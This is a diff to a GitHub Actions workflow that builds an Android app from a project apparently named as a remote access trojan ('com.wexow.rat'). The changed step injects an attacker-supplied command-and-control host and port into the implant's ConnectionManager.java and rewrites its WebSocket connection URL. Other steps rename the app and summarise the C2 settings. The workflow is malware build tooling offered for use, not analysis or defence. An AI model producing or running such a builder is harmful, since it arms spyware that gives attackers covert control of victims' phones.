@@ -98,17 +98,35 @@ jobs:
       # ── Patch C2 host in ConnectionManager ───────────────────────────────
       - name: Patch C2 host
         run: |
-          C2="${{ github.event.inputs.c2_host }}"
+          # Strip any scheme prefix (https://, http://, wss://, ws://) and trailing slashes.
+          # ConnectionManager.java hardcodes "wss://" + HOST + "/ws" so HOST must be a bare
+          # hostname or IP — no scheme, no trailing slash.
+          RAW="${{ github.event.inputs.c2_host }}"
+          C2=$(echo "$RAW" | sed -E 's|^https?://||; s|^wss?://||; s|/+$||')
           PORT="${{ github.event.inputs.c2_port }}"
           FILE="client/app/src/main/java/com/wexow/rat/core/ConnectionManager.java"
-          # Replace HOST field
+
+          echo "Patching HOST → $C2 | PORT → $PORT"
+
+          # 1. Replace the HOST field value
           sed -i "s|public static String HOST = \".*\";|public static String HOST = \"${C2}\";|" "$FILE"
-          # If a PORT field exists, patch it too; otherwise inject after HOST line
+
+          # 2. Inject or replace PORT field
           if grep -q 'public static int PORT' "$FILE"; then
             sed -i "s|public static int PORT = [0-9]*;|public static int PORT = ${PORT};|" "$FILE"
           else
             sed -i "/public static String HOST = /a\\    public static int PORT = ${PORT};" "$FILE"
           fi
+
+          # 3. Patch the WebSocket URL construction to include PORT.
+          #    Original line:  String url = "wss://" + HOST + "/ws";
+          #    Patched line:   String url = "wss://" + HOST + ":" + PORT + "/ws";
+          #    This is safe to run even if it was already patched (idempotent match).
+          sed -i 's|"wss://" + HOST + "/ws"|"wss://" + HOST + ":" + PORT + "/ws"|g' "$FILE"
+
+          # 4. Verify patch landed correctly
+          echo "--- ConnectionManager C2 lines ---"
+          grep -n "HOST\|PORT\|wss" "$FILE" | head -10
 
       # ── Patch app display name ────────────────────────────────────────────
       - name: Patch app name
@@ -254,3 +272,4 @@ jobs:
           echo "| C2 Port | ${{ github.event.inputs.c2_port }} |" >> $GITHUB_STEP_SUMMARY
           echo "| APK Size | ${{ steps.apk.outputs.size }} |" >> $GITHUB_STEP_SUMMARY
           echo "| Icon | ${{ github.event.inputs.app_icon_url != '' && 'Custom' || 'Default' }} |" >> $GITHUB_STEP_SUMMARY
+          
